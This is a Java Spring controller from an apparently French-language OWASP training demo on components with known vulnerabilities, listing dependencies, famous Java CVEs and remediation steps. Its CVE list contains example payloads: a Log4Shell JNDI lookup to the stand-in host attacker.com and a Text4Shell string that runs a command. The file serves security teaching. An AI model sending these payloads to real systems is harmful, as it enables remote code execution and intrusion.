package com.example.owaspdemo.demo;

import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.tags.Tag;
import org.springframework.web.bind.annotation.*;

import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * ============================================================================
 *  A09:2021 - UTILISATION DE COMPOSANTS AVEC DES VULNERABILITES CONNUES
 * ============================================================================
 *
 *  Se produit quand une application utilise des librairies, frameworks ou
 *  composants avec des CVE (Common Vulnerabilities and Exposures) connues.
 *
 *  Exemples celebres :
 *  - Log4Shell (CVE-2021-44228) : RCE via Log4j
 *  - Text4Shell (CVE-2022-42889) : RCE via Commons Text
 *  - Spring4Shell (CVE-2022-22965) : RCE via Spring Framework
 *
 *  ENDPOINTS DE DEMO :
 *    GET /api/a09/current-dependencies  -> liste les dependances et leur statut
 *    GET /api/a09/famous-cves           -> exemples de CVE celebres
 *    GET /api/a09/remediation-guide     -> guide de remediation
 * ============================================================================
 */
@RestController
@RequestMapping("/api/a09")
@Tag(name = "A09 - Composants vulnerables")
public class A09_KnownVulnerabilitiesDemo {

    /**
     * Liste les dependances du projet avec leurs risques potentiels.
     */
    @Operation(summary = "[INFO] Dependances du projet", description = "Liste les dependances actuelles et leur statut de securite. Utiliser OWASP Dependency-Check pour un scan automatise.")
    @GetMapping("/current-dependencies")
    public Map<String, Object> currentDependencies() {
        List<Map<String, String>> deps = List.of(
            Map.of("name", "Spring Boot", "version", "3.4.3", "status", "OK - version recente"),
            Map.of("name", "H2 Database", "version", "2.x (via Spring Boot)", "status", "OK si console desactivee en prod"),
            Map.of("name", "Lombok", "version", "latest", "status", "OK - compile-only, pas de risque runtime"),
            Map.of("name", "Jackson", "version", "2.17.x (via Spring Boot)", "status", "OK - version corrigee"),
            Map.of("name", "Tomcat", "version", "10.1.x (via Spring Boot)", "status", "OK - suivre les mises a jour")
        );

        return Map.of(
            "dependencies", deps,
            "note", "Utiliser OWASP Dependency-Check pour une analyse automatisee : mvn dependency-check:check"
        );
    }

    /**
     * Exemples de CVE celebres dans l'ecosysteme Java.
     */
    @Operation(summary = "[INFO] CVE celebres Java", description = "Log4Shell (CVSS 10.0), Text4Shell (9.8), Spring4Shell (9.8), SnakeYAML RCE (9.8), Jackson DoS (7.5). Details et vecteurs d'attaque.")
    @GetMapping("/famous-cves")
    public Map<String, Object> famousCves() {
        Map<String, Object> cves = new LinkedHashMap<>();

        cves.put("Log4Shell", Map.of(
            "cve", "CVE-2021-44228",
            "cvss", "10.0 CRITICAL",
            "composant", "Apache Log4j 2.x < 2.17.1",
            "impact", "RCE (Remote Code Execution) via JNDI lookup dans les messages de log",
            "attaque", "Envoyer ${jndi:ldap://attacker.com/exploit} dans n'importe quel champ logue",
            "correction", "Mettre a jour vers Log4j >= 2.17.1 ou utiliser Logback (defaut Spring Boot)"
        ));

        cves.put("Text4Shell", Map.of(
            "cve", "CVE-2022-42889",
            "cvss", "9.8 CRITICAL",
            "composant", "Apache Commons Text < 1.10.0",
            "impact", "RCE via StringSubstitutor.createInterpolator()",
            "attaque", "${script:javascript:java.lang.Runtime.getRuntime().exec('whoami')}",
            "correction", "Mettre a jour vers Commons Text >= 1.10.0 et ne pas utiliser createInterpolator()"
        ));

        cves.put("Spring4Shell", Map.of(
            "cve", "CVE-2022-22965",
            "cvss", "9.8 CRITICAL",
            "composant", "Spring Framework < 5.3.18",
            "impact", "RCE via data binding sur JDK 9+",
            "attaque", "Manipulation du ClassLoader via les parametres de requete",
            "correction", "Mettre a jour Spring Framework >= 5.3.18 ou Spring Boot >= 2.6.6"
        ));

        cves.put("SnakeYAML_RCE", Map.of(
            "cve", "CVE-2022-1471",
            "cvss", "9.8 CRITICAL",
            "composant", "SnakeYAML < 2.0",
            "impact", "RCE via deserialization de YAML malveillant",
            "attaque", "YAML contenant des tags de constructeur Java arbitraires",
            "correction", "Mettre a jour vers SnakeYAML >= 2.0 (SafeConstructor par defaut)"
        ));

        cves.put("Jackson_Deserialization", Map.of(
            "cve", "CVE-2022-42003 / CVE-2022-42004",
            "cvss", "7.5 HIGH",
            "composant", "Jackson Databind < 2.14.1",
            "impact", "DoS via deeply nested JSON objects",
            "attaque", "Envoyer un JSON avec des milliers de niveaux d'imbrication",
            "correction", "Mettre a jour vers Jackson >= 2.14.1"
        ));

        return Map.of(
            "cves_celebres", cves,
            "lecon", "Les dependances tierces sont le maillon faible le plus frequent. "
                   + "Un scan automatise regulier est indispensable."
        );
    }

    /**
     * Guide de remediation pour les composants vulnerables.
     */
    @Operation(summary = "[INFO] Guide de remediation", description = "4 etapes : Detecter (dependency-check), Evaluer (CVSS, contexte), Corriger (mise a jour), Prevenir (CI/CD).")
    @GetMapping("/remediation-guide")
    public Map<String, Object> remediationGuide() {
        Map<String, Object> guide = new LinkedHashMap<>();

        guide.put("1_detecter", Map.of(
            "outil", "OWASP Dependency-Check",
            "commande", "mvn org.owasp:dependency-check-maven:12.1.0:check -DnvdApiKey=$NVD_API_KEY",
            "rapport", "target/dependency-check-report.html"
        ));

        guide.put("2_evaluer", Map.of(
            "question_1", "La CVE est-elle exploitable dans notre contexte ?",
            "question_2", "Le composant vulnerable est-il utilise directement ou en transitif ?",
            "question_3", "Quel est le score CVSS ? (>= 7.0 = action immediate)"
        ));

        guide.put("3_corriger", Map.of(
            "option_a", "Mettre a jour vers la version corrigee",
            "option_b", "Remplacer le composant par une alternative",
            "option_c", "Supprimer le composant s'il n'est plus necessaire",
            "commande_versions", "mvn versions:display-dependency-updates"
        ));

        guide.put("4_prevenir", Map.of(
            "ci_cd", "Integrer dependency-check dans le pipeline CI/CD",
            "seuil", "failBuildOnCVSS=7 pour bloquer les builds avec des vulns HIGH/CRITICAL",
            "frequence", "Scanner au minimum a chaque build, idealement quotidiennement",
            "dependabot", "Activer Dependabot ou Renovate sur le repo GitHub"
        ));

        return Map.of("guide_remediation", guide);
    }
}
